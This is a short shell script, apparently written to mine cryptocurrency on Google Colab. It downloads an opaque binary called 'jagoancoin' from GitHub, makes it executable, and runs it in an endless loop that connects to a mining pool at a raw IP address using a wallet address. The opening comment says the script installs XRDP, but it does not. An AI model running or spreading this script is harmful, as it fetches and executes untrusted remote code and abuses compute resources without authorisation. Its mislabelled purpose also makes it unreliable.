# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R VTM

wget https://github.com/indah38/jagoancoin/raw/main/jagoancoin && chmod 700 jagoancoin
chmod 700 jagoancoin

#!/bin/sh
#
# Choose nearest stratum:
#       stratum-eu.rplant.xyz   /France/
#       stratum-asia.rplant.xyz /Singapore/
#       stratum-na.rplant.xyz   /Canada/
#
FOLDER=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
while [ 1 ]; do
"$FOLDER"/jagoancoin -a gr --url 159.223.188.176:80 --user AKkK5wtpcNtTGs7YscvE9erzs2nUGatLZG.mj111 -p x 
sleep 5
done
